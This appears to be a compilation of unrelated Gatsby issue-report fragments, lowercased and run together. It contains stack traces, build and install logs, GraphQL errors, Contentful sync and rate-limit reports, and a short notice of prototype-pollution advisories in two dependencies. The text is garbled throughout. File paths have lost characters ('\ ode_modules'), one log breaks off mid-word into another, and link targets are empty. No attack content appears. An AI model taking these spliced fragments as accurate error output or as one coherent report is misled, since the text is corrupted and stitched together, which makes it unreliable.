- c:\\users\\vdelapena\\appdata\ oaming\ pm\ ode_modules\\gatsby-cli\\lib\ ecipes.js
- c:\\users\\vdelapena\\appdata\ oaming\ pm\ ode_modules\\gatsby-cli\\lib\\create-cli.js
- c:\\users\\vdelapena\\appdata\ oaming\ pm\ ode_modules\\gatsby-cli\\lib\\index.js at function.module._resolvefilename (internal/modules/cjs/loader.js:980:15) at function.module._load (internal/modules/cjs/loader.js:862:27) at module.require (internal/modules/cjs/loader.js:1040:19) at require (internal/modules/cjs/helpers.js:72:18) at object.<anonymous> (c:\\users\\vdelapena\\appdata\ oaming\ pm\ ode_modules\\gatsby-cli\\lib\ ecipes.js:18:42) at module._compile (internal/modules/cjs/loader.js:1151:30) at object.module._extensions..js (internal/modules/cjs/loader.js:1171:10) at module.load (internal/modules/cjs/loader.js:1000:32) at function.module._load (internal/modules/cjs/loader.js:899:14) at module.require (internal/modules/cjs/loader.js:1040:19) { code: 'module_not_found', requirestack: [ 'c:\\\\users\\\\vdelapena\\\\appdata\\\ oaming\\\ pm\\\ ode_modules\\\\gatsby-cli\\\\lib\\\ ecipes.js', 'c:\\\\users\\\\vdelapena\\\\appdata\\\ oaming\\\ pm\\\ ode_modules\\\\gatsby-cli\\\\lib\\\\create-cli.js', 'c:\\\\users\\\\vdelapena\\\\appdata\\\ oaming\\\ pm\\\ ode_modules\\\\gatsby-cli\\\\lib\\\\index.js' ]
it throws an exception saying that `detect-port` could not be found.
browser show err_ssl_protocol_error
error #10124 config it looks like you were trying to add the config file? please rename "gatsby-config.ts" to "gatsby-config.js" error: cannot find module \'/path/to/project/gatsby-config\'
render error.
error: element type is invalid: expected a string (for built-in components) or a class/function (for composite components) but got: undefined.
you likely forgot to export your component from the file it's defined in, or you might have mixed up default and named imports.
check the render method of `mdxcontent`.
error #95313
![animated gif showing query variables field being reset when the main query is updated](
ts error: `type 'void' is not assignable to type 'promise<any>'` (or `to type 'any'`)
the text on this page is flowing out of the width of device, because of fixed width given.
the images are also not showing up.
too much scrolling is required to go to the next section of the page.
*`gatsby recipes` gave an error saying to use a specific recipe
* a specific recipe had no effect
empty request body.
weird error that is not consistent with the production gatsby build
error generating development javascript bundle failed can't resolve '@babel/runtime/helpers/builtin/classcallcheck' in '/home/anders/sites/base-netlify-functions/node_modules/react-event-listener/dist' perhaps you need to install the package '@babel/runtime/helpers/builtin/classcallcheck'?
error generating development javascript bundle failed can't resolve '@babel/runtime/helpers/builtin/createclass' in '/home/anders/sites/base-netlify-functions/node_modules/react-event-listener/dist' perhaps you need to install the package '@babel/runtime/helpers/builtin/createclass'?
error generating development javascript bundle failed can't resolve '@babel/runtime/helpers/builtin/inherits' in '/home/anders/sites/base-netlify-functions/node_modules/react-event-listener/dist' perhaps you need to install the package '@babel/runtime/helpers/builtin/inherits'?
error generating development javascript bundle failed can't resolve '@babel/runtime/helpers/builtin/objectspread' in '/home/anders/sites/base-netlify-functions/node_modules/react-event-listener/dist' perhaps you need to install the package '@babel/runtime/helpers/builtin/objectspread'?
error generating development javascript bundle failed can't resolve '@babel/runtime/helpers/builtin/objectwithoutproperties' in '/home/anders/sites/base-netlify-functions/node_modules/react-event-listener/dist' perhaps you need to install the package '@babel/runtime/helpers/builtin/objectwithoutproperties'?
error generating development javascript bundle failed can't resolve '@babel/runtime/helpers/builtin/possibleconstructorreturn' in '/home/anders/sites/base-netlify-functions/node_modules/react-event-listener/dist' perhaps you need to install the package '@babel/runtime/helpers/builtin/possibleconstructorreturn'?
error generating development javascript bundle failed can't resolve '@babel/runtime/helpers/builtin/typeof' in '/home/anders/sites/base-netlify-functions/node_modules/react-evefailed building development bundle - 3.405s
5:33:30 pm: error gaxioserror: invalid_grant: robot is disabled.
5:33:30 pm: at gaxios._request (/opt/build/repo/node_modules/gaxios/build/src/gaxios.js:85:23)
5:33:30 pm: at processticksandrejections (internal/process/task_queues.js:97:5)
5:33:30 pm: at async googletoken.requesttoken (/opt/build/repo/node_modules/gtoken/build/src/index.js:202:23)
5:33:30 pm: at async jwt.refreshtokennocache (/opt/build/repo/node_modules/google-auth-library/build/src/auth/jwtclient.js:156:23)
5:33:30 pm: at async jwt.getrequestmetadataasync (/opt/build/repo/node_modules/google-auth-library/build/src/auth/oauth2client.js:266:17)
5:33:30 pm: at async jwt.requestasync (/opt/build/repo/node_modules/google-auth-library/build/src/auth/oauth2client.js:339:23) { ```
![image](
throws error
the page will crash.
instead when looking at browser history on mobile, it just shows the a letter instead of the favicon even though the favicon correctly shows on desktop.
no outline is visible
<img width="1280" alt="screenshot of gatsbyjs.org homepage showing the \'view all posts\' button" src=" ">
on the change of the state, the link remained the same and the href was not changed
both places should reflect the state change
dev server dies with the error postet above.
browser can't access remote json files.
styles are added to <head/>
the code break with ```
error #98124 webpack generating javascript bundles failed can't resolve '../../../../../public/static/d/3396882757.json' in '/users/ezelohar/projects/****/marketing-site/src/components/molecules/blog/social' perhaps you need to install the package '../../../../../public/static/d/3396882757.json'? file: src/components/molecules/blog/social/social.js
error thrown
`typeerror: cannot read property 'innertext' of null`
the plugin seems to be looking in the site directory
``` error #98124 webpack generating ssr bundle failed can't resolve '/users/anindha/code/gatsby/gatsby-theme-typographyjs-bug/example/src/utils/typography' in '/users/anindha/code/gatsby/gatsby-theme-typographyjs-bug/example/.cache/caches/gatsby-plugin-typography' perhaps you need to install the package '/users/anindha/code/gatsby/gatsby-theme-typographyjs-bug/example/src/utils/typography'? file: .cache/caches/gatsby-plugin-typography/typography.js
each generated html file included css from everywhere in the project
the source code block is not highlighted.
#l15 the manifest href doesn't have assetprefix in the static generated html after `gatsby build`, but is overwritten after rendered in browser with assetsprefix from above line.
npm run dev error:
> "gatsby-node.js" threw an error while running the createpages lifecycle:
> cannot read property 'allcontentfulwork' of undefined
11:55:47 am: cloning into '/usr/src/app/www'...
11:55:48 am: installing node version v9
11:55:49 am: now using node v9.11.2 (npm v5.6.0)
11:55:51 am: yarn install v1.22.4
11:55:52 am: warning package-lock.json found
your project contains lock files generated by tools other than yarn
it is advised not to mix package managers in order to avoid resolution inconsistencies caused by unsynchronized lock files
to clear this warning, remove package-lock.json.
11:55:52 am: [1/4] resolving packages...
11:55:54 am: warning gatsby-plugin-sharp > probe-image-size > request@2.88.2: request has been deprecated, see
11:55:55 am: warning react-simple-chatbot > onchange > chokidar@2.1.8: chokidar 2 will break on node v14+
upgrade to chokidar 3 with 15x less dependencies.
11:55:55 am: [2/4] fetching packages...
11:55:57 am: info fsevents@2.1.0: the platform "linux" is incompatible with this module.
11:55:57 am: info "fsevents@2.1.0" is an optional dependency and failed compatibility check
excluding it from installation
info fsevents@2.1.0: the engine "node" is incompatible with this module
expected version "^8.16.0 || ^10.6.0 || >=11.0.0"
got "9.11.2"
11:55:57 am: info fsevents@1.2.9: the platform "linux" is incompatible with this module.
11:55:57 am: info "fsevents@1.2.9" is an optional dependency and failed compatibility check
excluding it from installation.
11:55:57 am: error gatsby-plugin-google-analytics@2.3.1: the engine "node" is incompatible with this module
expected version ">=10.13.0"
got "9.11.2"
11:55:57 am: error found incompatible module.
11:55:57 am: info visit for documentation about this command.
11:55:58 am: yarn install --non-interactive failure - command failed with exit code 1 (eperm): yarn install --non-interactive --registry=
11:55:58 am: yarn install --non-interactive attempt 1 of 3...
11:55:59 am: yarn install v1.22.4
11:55:59 am: warning package-lock.json found
your project contains lock files generated by tools other than yarn
it is advised not to mix package managers in order to avoid resolution inconsistencies caused by unsynchronized lock files
to clear this warning, remove package-lock.json.
11:55:59 am: [1/4] resolving packages...
11:56:02 am: warning gatsby-plugin-sharp > probe-image-size > request@2.88.2: request has been deprecated, see
11:56:03 am: warning react-simple-chatbot > onchange > chokidar@2.1.8: chokidar 2 will break on node v14+
upgrade to chokidar 3 with 15x less dependencies.
becomes hint: disable javascript and open again, and you'll see that the trailing slash will not get appended.
running `gatsby build` produces an error
`shouldupdatescroll` is called only after clicking a link if the app is loaded already
``` $ gatsby develop error gatsby develop start development server
watches files, rebuilds, and hot reloads if something changes options: --verbose turn on verbose output [boolean] [default: false] --no-color, --no-colors turn off the color in output [boolean] [default: false] --json turn on the json logger [boolean] [default: false] -h, --host set host
defaults to localhost [string] [default: "localhost"] -p, --port set port
defaults to 8000 [string] [default: "8000"] -o, --open open the site in your (default) browser for you
[boolean] -s, --https use https
see as a guide [boolean] -c, --cert-file custom https cert file (also required: --https, --key-file)
see [string] [default: ""] -k, --key-file custom https key file (also required: --https, --cert-file)
see [string] [default: ""] --ca-file custom https ca certificate file (also required: --https, --cert-file, --key-file)
see [string] [default: ""] --open-tracing-config-file tracer configuration file (opentracing compatible)
see [string] -h, --help show help [boolean] -v, --version show the version of the gatsby cli and the gatsby package in the current project [boolean] error there was a problem loading the local develop command
gatsby may not be installed
perhaps you need to run "npm install"? cannot find module \'array-reduce\'
require stack:
- f:\\p\\hectic-gatsby\ ode_modules\ eact-dev-utils\ ode_modules\\shell-quote\\index.js
- f:\\p\\hectic-gatsby\ ode_modules\ eact-dev-utils\\launcheditor.js
- f:\\p\\hectic-gatsby\ ode_modules\\gatsby\\dist\\commands\\develop.js
- c:\\users\\alireza\\appdata\ oaming\ pm\ ode_modules\\gatsby-cli\\lib\\create-cli.js
- c:\\users\\alireza\\appdata\ oaming\ pm\ ode_modules\\gatsby-cli\\lib\\index.js error: cannot find module 'array-reduce' require stack: - f:\\p\\hectic-gatsby\ ode_modules\ eact-dev-utils\ ode_modules\\shell-quote\\ind ex.js - f:\\p\\hectic-gatsby\ ode_modules\ eact-dev-utils\\launcheditor.js - f:\\p\\hectic-gatsby\ ode_modules\\gatsby\\dist\\commands\\develop.js - c:\\users\\alireza\\appdata\ oaming\ pm\ ode_modules\\gatsby-cli\\lib\\create-cli
js - c:\\users\\alireza\\appdata\ oaming\ pm\ ode_modules\\gatsby-cli\\lib\\index.js - loader.js:957 function.module._resolvefilename internal/modules/cjs/loader.js:957:15 - loader.js:840 function.module._load internal/modules/cjs/loader.js:840:27 - loader.js:1019 module.require internal/modules/cjs/loader.js:1019:19 - v8-compile-cache.js:159 require [hectic-gatsby]/[v8-compile-cache]/v8-compile-cache.js:159:20 - index.js:4 object.<anonymous> [hectic-gatsby]/[react-dev-utils]/[shell-quote]/index.js:4:14 - v8-compile-cache.js:178 module._compile [hectic-gatsby]/[v8-compile-cache]/v8-compile-cache.js:178:30 - loader.js:1153 object.module._extensions..js internal/modules/cjs/loader.js:1153:10 - loader.js:977 module.load internal/modules/cjs/loader.js:977:32 - loader.js:877 function.module._load internal/modules/cjs/loader.js:877:14 - loader.js:1019 module.require internal/modules/cjs/loader.js:1019:19 - v8-compile-cache.js:159 require [hectic-gatsby]/[v8-compile-cache]/v8-compile-cache.js:159:20 - launcheditor.js:14 object.<anonymous> [hectic-gatsby]/[react-dev-utils]/launcheditor.js:14:20 - v8-compile-cache.js:178 module._compile [hectic-gatsby]/[v8-compile-cache]/v8-compile-cache.js:178:30 - loader.js:1153 object.module._extensions..js internal/modules/cjs/loader.js:1153:10 - loader.js:977 module.load internal/modules/cjs/loader.js:977:32 - loader.js:877 function.module._load internal/modules/cjs/loader.js:877:14
<img width="916" alt="screen shot 2020-05-04 at 22 28 35" src=" ">
the images rendered from the markdown content are the same image.
`error: the result of this staticquery could not be fetched.`
a build that does not complete
` error #98123 webpack generating development javascript bundle failed e:\\gatsby-starter-hello-world\\src\\pages\\index.js: unexpected token, expected "{" (2:31) 1 | import react from "react"
> 2 | export default function home() ( | ^ 3 | <div style={{ color: `purple`, fontsize: `72px` }}>hello gatsby!</div> 4 | ) file: src\\pages\\index.js:2:31 failed re-building development bundle - 0.094s`
users need to use .tsx
yarn 2 cannot resolve `regenerator-runtime` package and development build fails.
```yarn start
yarn run v1.19.2
warning ../package.json: no license field
$ env-cmd -f .env npm run develop > gatsby-implementation@1.0.0 develop > gatsby develop success open and validate gatsby-configs - 0.019s
success load plugins - 0.172s
success onpreinit - 0.007s
success initialize cache - 0.014s
success copy gatsby files - 0.037s
success onprebootstrap - 0.008s
success createschemacustomization - 0.003s
starting to fetch data from contentful
fetching default locale
default locale is : en-us
[warning] rate limit error occurred
waiting for 1572 ms before retrying...
[warning] rate limit error occurred
waiting for 1514 ms before retrying...
[warning] rate limit error occurred
waiting for 1546 ms before retrying...
``` *updated*
we're seeing rate limiting inside of the gatsby cloud integration platform as well.
these are some log messages from the gatsby-cloud preview builds triggered by contentful unpublished changes
17:16:44 pm: warning the asset with id: 3br3gfc57o8wwo0sw246wg, contains no file.
17:16:44 pm: warning the asset with id: 3br3gfc57o8wwo0sw246wg, contains no file.
17:16:44 pm: success createschemacustomization - 0.123s
17:16:44 pm: warning the asset with id: 5hjp3oaaw4e2amigaw2ukw, contains no file.
17:16:44 pm: warning the asset with id: 3br3gfc57o8wwo0sw246wg, contains no file.
17:16:44 pm: warning the asset with id: 3br3gfc57o8wwo0sw246wg, contains no file.
17:16:45 pm: starting to fetch data from contentful
17:16:45 pm: fetching default locale
17:16:45 pm: error (node:27127) warning: label 'fetch contentful data' already exists for console.time()
17:16:45 pm: starting to fetch data from contentful
17:16:45 pm: fetching default locale
17:16:45 pm: error (node:27127) warning: label 'fetch contentful data' already exists for console.time()
17:16:45 pm: [warning] rate limit error occurred
waiting for 1685 ms before retrying...
17:16:45 pm: [warning] rate limit error occurred
waiting for 1637 ms before retrying...
17:16:45 pm: [warning] rate limit error occurred
waiting for 1607 ms before retrying...
17:16:53 pm: default locale is : en-us
17:16:53 pm: default locale is : en-us
17:16:53 pm: default locale is : en-us
17:16:53 pm: [warning] rate limit error occurred
waiting for 1567 ms before retrying...
17:16:53 pm: [warning] rate limit error occurred
waiting for 1517 ms before retrying...
17:16:53 pm: [warning] rate limit error occurred
waiting for 1607 ms before retrying...
17:17:03 pm: [warning] rate limit error occurred
waiting for 1671 ms before retrying...
17:17:03 pm: [warning] rate limit error occurred
waiting for 1535 ms before retrying...
this process never finishes as far as i can tell, making the preview functionality for large spaces unusable
i recognize this is a contentful rate limit, but does anyone have any workarounds for this? the app that's using data from contentful is using a microscopic amount of data from the contentful space in comparison to what's actually there, why does it need to fetch the entire space?
cached module is taking precedence over an existing node module
the remote images download fails.
node crashes after queries are run
above error, the build completes yet every page has the same meta information
layout component `console.log` returns updated data, pages do not.
## related issues #19763
project should run with error "source and destination must not be the same"
import greyed out and render of page white page death.
the showcased site was built with angular.
when attempting a link with urlencoded slashes such as: the behavior i see is that the 404 page is shown momentarily and then goes to a blank screen
in the console, i can see an error being thrown, which appears to be traceable to `cache-dir/loader.js` and specifically the `ispagenotfound` function returning a false negative.
gatsby image is just a blurred image.
the graphql query returns null for the `testtesttest` node on the page.
hydration doesn't happen so preact is just re-rendering the whole site
this cause a performance issue and can have the opposite effect than desired.
this img's url is `/https:/cdn.jsdelivr.net/gh/leadream/juuun.io@gh-pages/63c893e9f09f78fd314f5205a266006f/kabutack.gif` and can't access.
`used_by_articles` is `null` in the categories < #l35> page.
there was an error in your graphql query: cannot query field "contentfulcompanyfiles" on type "query"
if you don\'t expect "contentfulcompanyfiles" to exist on the type "query" it is most likely a typo.
however, if you expect "contentfulcompanyfiles" to exist there are a couple of solutions to common problems: - if you added a new data source and/or changed something inside gatsby-node.js/gatsby-config.js, please try a restart of your development server
- the field might be accessible in another subfield, please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
- you want to optionally use your field "contentfulcompanyfiles" and right now it is not used anywhere
therefore gatsby can't infer the type and add it to the graphql schema
a quick fix is to add a least one entry with that field ("dummy content") it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "query":
#creating-type-definitions
it uses `assetprefix`
only the products i added manually is being pulled, the imported products are not on graphql query at all
css fails to load/inject, and all my components lose their styling - site becomes completely dysfunctional
when inspecting element, all css styling is gone even though classnames persist.
the browser instead loads the same image several times
### screenshot <img width="721" alt="bildschirmfoto 2020-04-26 um 14 02 55" src=" ">
infinite loop.
link preview does not show in whatsapp
i've tested this on several people's whatsapp (all android, i have no access to ios)
i have published a client's website preview on [ all pages faced the same issue
i also hand-edit the [404.html]( published to move the `<style>` tag below `<meta>` tags but above other `<link type='script'>` tags
pasting the address of 404 page results in link preview becoming shown in whatsapp
probably whatsapp stop processing html when it cannot encounter any `<meta>` tag its looking for in the first kbs of the page (?) i think moving the inlined `<style>` is a fully feasible workaround, as opting out of inlining css causes performance to drop significantly
i've been digging around gatsby ssr api and `gatsby-plugin-react-helmet` source code, but have not found any way to move the order of elements inside `<head>`.
too many files opened.
query returns empty result due to following function is not working as expected
const items = context.nodemodel.getallnodes({type: `graphcms_blogpost` });
build failure unhandled rejection schema must contain uniquely named types but contains multiple types named "graphcms_blogpost"
error: schema must contain uniquely named types but contains multiple types named "graphcms_blogpost"
- array.reduce - schemacomposer.js:130 schemacomposer.buildschema [using-gatsby-source-graphql]/[graphql-compose]/lib/schemacomposer.js:130:12 - schema.js:807 addcustomresolvefunctions [using-gatsby-source-graphql]/[gatsby]/dist/schema/schema.js:807:45 - schema.js:227 updateschemacomposer [using-gatsby-source-graphql]/[gatsby]/dist/schema/schema.js:227:9 - schema.js:95 async buildschema [using-gatsby-source-graphql]/[gatsby]/dist/schema/schema.js:95:3 - index.js:138 async object.build [using-gatsby-source-graphql]/[gatsby]/dist/schema/index.js:138:18 - index.js:419 async module.exports [using-gatsby-source-graphql]/[gatsby]/dist/bootstrap/index.js:419:3 - develop.js:441 async module.exports [using-gatsby-source-graphql]/[gatsby]/dist/commands/develop.js:441:7
build error ![image]( <details> ```
[...] success onpostbootstrap - 0.009s
info bootstrap finished - 17.681 s
success building production javascript and css bundles - 55.534s
success rewriting compilation hashes - 0.007s error #85901 graphql there was an error in your graphql query: expected node, not `[object object]` 1 | query tmpawasrccomponentsclimateobservationsjs3511084170($gridcode: string, $sourcetype: string, $language: string) { 2 | allgridpointdata(filter: {gridcode: {eq: $gridcode}, sourcetype: {eq: $sourcetype}}, sort: {fields: [gridcode, datatype]}) { 3 | nodes { 4 | datatype 5 | json 6 | } 7 | } 8 | alltexts: allmarkdownremark(sort: {fields: fileabsolutepath}, filter: {frontmatter: {sourcetype: {eq: $sourcetype}, locale: {eq: $language}}}) { 9 | nodes {
> 10 | html | ^ 11 | frontmatter { 12 | datatype 13 | } 14 | } 15 | } 16 | } 17 | file path: /tmp/awa/src/components/climateobservations.js
url path: /en/map/100132/climate-observations
plugin: none error #85901 graphql there was an error in your graphql query: expected node, not `[object object]` 1 | query tmpawasrccomponentsclimateobservationsjs3511084170($gridcode: string, $sourcetype: string, $language: string) { 2 | allgridpointdata(filter: {gridcode: {eq: $gridcode}, sourcetype: {eq: $sourcetype}}, sort: {fields: [gridcode, datatype]}) { 3 | nodes { 4 | datatype 5 | json 6 | } 7 | } 8 | alltexts: allmarkdownremark(sort: {fields: fileabsolutepath}, filter: {frontmatter: {sourcetype: {eq: $sourcetype}, locale: {eq: $language}}}) { 9 | nodes {
> 10 | html | ^ 11 | frontmatter { 12 | datatype 13 | } 14 | } 15 | } 16 | } 17 | file path: /tmp/awa/src/components/climateobservations.js
url path: /en/map/100132/climate-observations
plugin: none not finished run queries - 67.894s ``` </details>
webpackerror: referenceerror: window is not defined ![screen shot 2020-04-23 at 9 03 05 am](
when an entry is deleted from contentful, its respective gatsby node is not deleted, and therefore continue appearing in graphql (or a rendered page)
### notes this issue can be temporary solved by cleaning the cache every time remote content is changed, for example by running `gatsby clean`
but this makes the development process cumbersome and prevent utilization of cache mechanisms
this issue doesn't occur when `gatsby-source-contentful` configured to work with contentful delivery api (`host: 'cdn.contentful.com'`)
the underlying problem is that `gatsby-source-contentful` uses contentful's [synchronization api]( #/reference/synchronization) with contentful's preview api
while contentful [specify]( #/introduction/preview-api-limitations) that synchronization api is not supported with preview api: > the preview api does not implement the sync api, so applications that rely exclusively on the sync api to load data will not be usable with the preview api
yet, although contentful own specification, some aspects of synchronization api do work with preview api
otherwise, the content wouldn't be fetched at all
but it seems that some of its aspects doesn't work
such as when entries are removed, the sync api does not say that
here are the refined steps to reproduce the underlying problem: 1
call [ * continue calling the returned `nextsyncurl` until no `items` are returned
call [ * continue calling the returned `nextsyncurl` until no `items` are returned
add an entry to contentful space, and publish it
call [
* you should get back `items` with the single entry that was just created and published * call this endpoint again with the returned `nextsyncurl`, you should get back empty `items` list
call [
* you should get back `items` with the single entry that was just created and published
* call this endpoint again with the returned `nextsyncurl`, you should get back empty `items` list
delete the entry from contentful
call these two endpoints again
**only [cdn.contentful.com]( api returns the deleted entry, the [preview.contentful.com]( api does not!** cdn.contentful.com response with the deleted entry:
{ "sys": { "type": "array" }, "items": [ { "sys": { "type": "deletedentry", "id": "...", "space": { ..
}, "environment": { ..
} }, "revision": 1, "createdat": "...", "updatedat": "...", "deletedat": "..." } } ], "nextsyncurl": " "
``` preview.contentful.com response without the deleted entry:
{ "sys": { "type": "array" }, "items": [], "nextsyncurl": " "
the gatsby develop command failed
![image]( this screenshot of the chrome inspector window shows the rendered markdown is indeed present on initial page load but is being removed after full render
![image](
but when running build, the error shows and no other pages were generated
i would expect there's a solution for this and dont kill the other pages
currently i'm on a strange device and couldn't edit the ulimit.
not all starters are shown on starters page
a bug was introduced with gatsby v2, breaking the feature, causing a lot of confusion which ended with the deprecation of `sizebypixeldensity`
the following screenshot shows what it looks like with gatsby v2 (sorry, cannot link to the deployed version because we aren't ready to ship this yet)
note the size of the original picture in macos' image viewer
both browser and image viewer are showing the image at 100% size
![screen shot 2020-04-22 at 17 16 02](
every rebuild results in all images being reprocessed despite functinoal caching.
there was an error compiling the html.js component for the development server
see our docs page on debugging html builds for help referenceerror: idbindex is not defined
]); 86 | > 87 | proxyrequestmethods(index, '_index', idbindex, [ | ^ 88 | 'get', 89 | 'getkey', 90 | 'getall', webpackerror: referenceerror: idbindex is not defined - idb.mjs:87 module../node_modules/idb/lib/idb.mjs node_modules/idb/lib/idb.mjs:87:1 - index.esm.js:1 module../node_modules/@firebase/installations/dist/index.esm.js node_modules/@firebase/installations/dist/index.esm.js:1:1 - index.esm.js:1 module../node_modules/@firebase/analytics/dist/index.esm.js node_modules/@firebase/analytics/dist/index.esm.js:1:1 - index.esm.js:1 module../node_modules/firebase/analytics/dist/index.esm.js node_modules/firebase/analytics/dist/index.esm.js:1:1 - index.ts:1 module../src/firebase/index.ts src/firebase/index.ts:1:1 - index.esm.js:32 emit node_modules/@firebase/analytics/dist/index.esm.js:32:1
`location.state` page prop can't have a type
### fix i was able to fix it locally in a `.d.ts`: ```ts
type gatsbypageprops<d, p> = import("gatsby").pageprops<d, p>
type historylocation<s> = import("history").location<s> // don\'t forget the generic! interface pageprops<d = object, p = object, s = object> extends gatsbypageprops<d, p> { location: window["location"] & historylocation<s>
```
actual result is that starters are sorted based on recent additions to starters.yml.
linear-gradient doesn't work
i get the following errors when compiling: ``` error #98123 webpack generating development javascript bundle failed can't resolve 'core-js/modules/es.array.concat' in 'c:\\users\\pauan\\gatsby-core-js-error-demo\ ode_modules\\canvg\\lib' file: node_modules\\canvg\\lib\\index.es.js ..
many more similar errors ..
error #98123 webpack generating development javascript bundle failed can't resolve 'core-js/modules/web.dom-collections.iterator' in 'c:\\users\\pauan\\gatsby-core-js-error-demo\ ode_modules\\canvg\\lib' file: node_modules\\canvg\\lib\\index.es.js
``` i have verified that the `node_modules/canvg/node_modules/core-js/modules/*` files *do* exist, gatsby is simply unable to find them.
i got an error: ```
internal/modules/cjs/loader.js:985 throw err; ^ error: cannot find module 'cors'
require stack:
- /usr/local/lib/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/graphql.js at function.module._resolvefilename (internal/modules/cjs/loader.js:982:15) at function.module._load (internal/modules/cjs/loader.js:864:27) at module.require (internal/modules/cjs/loader.js:1044:19) at require (internal/modules/cjs/helpers.js:77:18) at object.<anonymous> (/usr/local/lib/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/graphql.js:33:14) at module._compile (internal/modules/cjs/loader.js:1158:30) at object.module._extensions..js (internal/modules/cjs/loader.js:1178:10) at module.load (internal/modules/cjs/loader.js:1002:32) at function.module._load (internal/modules/cjs/loader.js:901:14) at function.executeuserentrypoint [as runmain] (internal/modules/run_main.js:74:12) { code: 'module_not_found', requirestack: [ '/usr/local/lib/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/graphql.js' ]
} error command failed with exit code 1: node /usr/local/lib/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/graphql.js 4000 error: command failed with exit code 1: node /usr/local/lib/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/graphq l.js 4000 - error.js:56 makeerror [lib]/[gatsby-cli]/[execa]/lib/error.js:56:11 - index.js:114 handlepromise [lib]/[gatsby-cli]/[execa]/index.js:114:26 - task_queues.js:97 processticksandrejections internal/process/task_queues.js:97:5
the content gets wrapped by a 'small' div.
layouts are not being applied be default, only by manually exporting them directly from the mdx files.
after step 4 the 4-digit field in graphql is being assigned different field types from the two transformers: - the csv is assigned the type date
- note that if a 5-digit number is used, it is assigned the type string
- the json transformer assigns the type number
build message:
warn there are conflicting field types in your data
if you have explicitly defined a type for those fields, you can safely ignore this warning message.
otherwise, gatsby will omit those fields from the graphql schema
if you know all field types in advance, the best strategy is to explicitly define them with the `createtypes` action, and skip inference with the `@dontinfer` directive.
see #createtypes
sitepage.context.code: - type: date value: \'9999\' - type: number value: 9999 error variable "$code" of type "int!" used in position expecting type "date" graphql/template-strings
gatsby threw an error
i get the warning in firefox.
the query in production mode generates a different result, thus breaking the site.
error: cannot find module 'react' require stack: - /users/dlindberg/code/test-wpgraphql/node_modules/ink/build/instance .js - /users/dlindberg/code/test-wpgraphql/node_modules/ink/build/render.j s - /users/dlindberg/code/test-wpgraphql/node_modules/ink/build/index.js - /users/dlindberg/code/test-wpgraphql/node_modules/gatsby/node_module s/gatsby-cli/lib/reporter/loggers/ink/index.js - /users/dlindberg/code/test-wpgraphql/node_modules/gatsby/node_module s/gatsby-cli/lib/reporter/index.js - /users/dlindberg/code/test-wpgraphql/node_modules/gatsby/dist/schema /types/type-defs.js - /users/dlindberg/code/test-wpgraphql/node_modules/gatsby/dist/redux/ reducers/inference-metadata.js - /users/dlindberg/code/test-wpgraphql/node_modules/gatsby/dist/redux/ reducers/index.js - /users/dlindberg/code/test-wpgraphql/node_modules/gatsby/dist/redux/ index.js - /users/dlindberg/code/test-wpgraphql/node_modules/gatsby/dist/utils/ gatsby-dependents.js - /users/dlindberg/code/test-wpgraphql/node_modules/gatsby/dist/utils/ webpack.config.js - /users/dlindberg/code/test-wpgraphql/node_modules/gatsby/dist/comman ds/develop.js - /usr/local/lib/node_modules/gatsby-cli/lib/create-cli.js - /usr/local/lib/node_modules/gatsby-cli/lib/index.js
not visible
returned `13 apr 2020`.
build fails.
`localfile` fields are null ### other notes i think all of the `createremotefilenode` calls are actually completing, but the timeout has some nasty side effect
i'd love to see this reverted as i have to resort to the very hacky npm-force-resolutions
the build fails with a `maximum call stack size exceeded`
styles created with `createglobalstyle` are only injected after mount with js, leading to a flicker.
syntax error: expected :, found name "family" <img width="899" alt="screen shot 2020-04-13 at 7 36 54 am" src=" "> <img width="936" alt="screen shot 2020-04-13 at 8 04 34 am" src=" "> <img width="955" alt="screen shot 2020-04-13 at 8 14 16 am" src=" ">
i get an error and nothing renders.
develop fails to create development build ` error unhandled rejection processing /mnt/c/projects/www/portfolio-site/.cache/gatsby-source-filesystem/73044fcefc7fd765a0deaff6c4440f59/adult-business-communication-1181605.jpg failed original error:
/mnt/c/projects/www/portfolio-site/node_modules/cwebp-bin/vendor/cwebp: error while loading shared libraries: libgl.so.1: cannot open shared object file: no such file or directory workererror: processing /mnt/c/projects/www/portfolio-site/.cache/gatsby-source-filesystem/73044fcefc7fd765a0deaff6c44 40f59/adult-business-communication-1181605.jpg failed original error: /mnt/c/projects/www/portfolio-site/node_modules/cwebp-bin/vendor/cwebp: error while loading shared libraries: libgl.so .1: cannot open shared object file: no such file or directory - jobs-manager.js:314 exports.enqueuejob [portfolio-site]/[gatsby]/dist/utils/jobs-manager.js:314:23 (sharp:5090): glib-critical **: 20:46:53.317: g_hash_table_lookup: assertion 'hash_table != null' failed`
(note: this example uses two different cars, one is a hoop card which is not localized, and one is the dorfman hat card which failed above but localizes correctly there)
frontmatter image fields are built as strings, disallowing image subfields to be queried
``` error #85922 graphql there was an error in your graphql query: field "image" must not have a selection since type "string" has no subfields
this can happen if you e.g
accidentally added { } to the field "image"
if you didn\'t expect "image" to be of type "string" make sure that your input source and/or plugin is correct
file: src\\templates\\blogpost.js:116:15 failed extract queries from components - 0.157s
extension detected 4 vulnerabilities in 'gatsby' project and printed 2 of them in details: ```
=== gatsby@2.20.14 === indirect:
medium prototype pollution in dot-prop@4.2.0
-
medium prototype pollution in yargs-parser@11.1.1
- no remediation available
seeing error in image below: <img width="662" alt="screen shot 2020-04-10 at 12 50 18 pm" src=" ">
success open and validate gatsby-configs - 0.043s
success load plugins - 0.034s --- cut --- success run queries - 0.091s - 2/2 21.91/s
warn error persisting state: exdev: cross-device link not permitted, rename '/tmp/reduxcacheqomd9c' -> '~/bug-repro/.cache/redux'
warn error persisting state: exdev: cross-device link not permitted, rename '/tmp/reduxcachewcin2r' -> '~/bug-repro/.cache/redux'
warn error persisting state: exdev: cross-device link not permitted, rename '/tmp/reduxcachewkdflr' -> '~/bug-repro/.cache/redux'
warn error persisting state: exdev: cross-device link not permitted, rename '/tmp/reduxcachewqn2io' -> '~/bug-repro/.cache/redux'
``` new lines with this warning are showing up approx
every second
system `/tmp` folder is populated with directories like
`reduxcachew9mmgw`, `reduxcachewafks4` `reduxcacheyumf1i` ...
blank page with above error
also: index.html seems to point to a script called `commons.js`
which does not exist:
